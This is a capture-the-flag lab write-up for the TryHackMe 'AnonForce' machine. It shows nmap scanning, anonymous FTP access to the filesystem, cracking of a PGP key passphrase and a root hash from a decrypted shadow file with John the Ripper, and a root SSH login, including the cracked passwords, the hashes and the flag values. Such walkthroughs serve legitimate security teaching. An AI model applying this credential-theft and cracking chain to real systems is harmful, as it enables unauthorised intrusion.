# AnonForce 

## Recon
> #### IP: `10.10.45.31`
### Port Scanning

```sh

└─$ nmap -sS -sV -oN initial/nmap -O -oA searchsploit -o ports.txt 10.10.45.31

Nmap scan report for 10.10.45.31
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/27%OT=21%CT=1%CU=34657%PV=Y%DS=5%DC=I%G=Y%TM=66A5
OS:9B39%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)O
OS:PS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508S
OS:T11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)E
OS:CN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 27 21:13:29 2024 -- 1 IP address (1 host up) scanned in 27.60 seconds

```

#### Aggressive scan
```sh

└─$ sudo nmap -A -p- 10.10.45.31 >> aggressive_ports.txt 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-27 21:18 EDT
Nmap scan report for 10.10.45.31
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Jul 27 17:29 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x   95 0        0               0 Jul 27 17:29 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Jul 27 17:29 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Jul 27 17:29 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.88.30
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (96%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   44.52 ms  10.17.0.1
2   ... 4
5   174.43 ms 10.10.45.31

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.20 seconds
                                                                    
```

- **We found that we can login to ftp with anonymous login and the password should be the default  `anonymous`**

### FTP login

```sh
ftp> cd root
550 Failed to change directory.
ftp> cd home 
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||29587|)
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
c226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||35851|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> get user.txt -
remote: user.txt
229 Entering Extended Passive Mode (|||57756|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
606083fd33beb1284fc51f411a706af8
226 Transfer complete.
33 bytes received in 00:00 (0.18 KiB/s)

```

> ## user.txt : 606083fd33beb1284fc51f411a706af8``

- **There is a directory called notread . The name seems suspicious to me**
```sh
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||9133|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> get backup.pgp 
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||8367|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |***************************************************************************************************************************|   524       99.01 KiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (2.80 KiB/s)
ftp> get private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||57295|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |***************************************************************************************************************************|  3762       29.40 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (18.34 KiB/s)

```
- **We found two files there**
    - `backup.pgp`
    - `private.asc`

## `.pgp` & `.asc`

A `.pgp` file and a `.asc` file are both used in the context of encryption and digital signatures, primarily associated with Pretty Good Privacy (PGP) encryption software. Here's what they are:

### `.pgp` File
- **Purpose**: A `.pgp` file is typically used to store encrypted data or digital signatures created using PGP.
- **Content**: The content of a `.pgp` file is usually binary-encoded, which means the data is not human-readable.
- **Use Cases**: These files can be used to encrypt emails, files, or any data that needs to be securely transmitted or stored. They can also contain digital signatures to verify the authenticity of data.

### `.asc` File
- **Purpose**: A `.asc` file, which stands for ASCII Armored File, is used to store PGP encrypted data or digital signatures in a human-readable format.
- **Content**: The content of an `.asc` file is encoded in ASCII, making it readable as plain text. This is useful for sharing encrypted data or signatures via text-based mediums such as email or posting on a website.
- **Use Cases**: These files can contain public keys, private keys, encrypted messages, or signatures. They are often used when it's necessary to include PGP-encrypted data in text fields that don't support binary data.

- **We can use gpg to encrypt and decrypt to .pgp**
- **At first we have to make the `private.asc` file to a human readable format**

```sh
└─$ gpg2john private.asc > hash

File private.asc
                                                                                                                                                                        
┌──(***********)-[~/CTF{}/THM/AnonForce]
└─$ sudo john hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
xbox360          (anonforce)     
1g 0:00:00:04 DONE 2/3 (2024-07-28 08:52) 0.2232g/s 3545p/s 3545c/s 3545C/s xbox360
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
> ### Password for pgp file : xbox360


```sh
└─$ gpg --import private.asc   
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
                                                                                                                                                                        
┌──(***********)-[~/CTF{}/THM/AnonForce]
└─$ gpg --decrypt backup.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::       
```
> ### Root Hashed :`$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0` 

### Hash Identifier

```sh
└─$ hash-identifier        
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0

Possible Hashs:
[+] SHA-256
--------------------------------------------------

```
- **Doesn't do anything here but its helpful to know**

### Decrypting hash by John
```sh
└─$ nano root2boot
                                        
┌──(***********)-[~/CTF{}/THM/AnonForce]
└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt root2boot
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (?)     
1g 0:00:00:18 DONE (2024-07-28 09:02) 0.05488g/s 368.8p/s 368.8c/s 368.8C/s 98765432..BITCH
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
> ### Password : `hikari`

### SSH login

```sh
└─$ ssh root@10.10.45.31                                           
The authenticity of host '10.10.45.31 (10.10.45.31)' can't be established.
ED25519 key fingerprint is SHA256:+bhLW3R5qYI2SvPQsCWR9ewCoewWWvFfTVFQUAGr+ew.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:19: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.45.31' (ED25519) to the list of known hosts.
root@10.10.45.31's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;

root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt 
f706456440c7af4187810c31c6cebdce
root@ubuntu:~# 

```

> ### root.txt : `f706456440c7af4187810c31c6cebdce`